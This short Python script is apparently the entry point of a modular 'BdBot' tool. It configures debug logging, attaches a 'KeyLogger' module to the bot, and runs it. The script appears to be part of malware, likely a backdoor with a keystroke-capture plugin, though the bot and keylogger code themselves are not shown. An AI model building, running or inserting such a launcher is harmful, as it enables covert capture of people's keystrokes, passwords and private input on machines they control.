import logging
import platform

from BdBot import BdBot



# Configure logging
logging.basicConfig(level=logging.DEBUG)

if __name__ == '__main__':
    bd= BdBot()

    #add modules you want
    import KeyLogger
    KeyLogger.KeyLogger(bd)

    bd.run()


